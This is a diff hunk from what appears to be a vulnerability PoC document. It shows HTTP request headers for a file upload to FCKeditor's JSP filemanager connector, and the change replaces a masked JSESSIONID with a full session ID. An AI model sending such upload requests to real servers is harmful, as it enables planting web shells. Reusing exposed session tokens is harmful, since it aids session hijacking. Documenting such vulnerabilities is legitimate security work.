@@ -60,7 +60,7 @@ schema_version: "1"
 ```http
 POST /common/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=&CurrentFolder=/ HTTP/1.1
 Host: 
-Cookie: JSESSIONID=1******************************F
+Cookie: JSESSIONID=17A17E4D9E4E38B72D650895AF
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryt1qdEWTI01cj5BLV
 Connection: close
 
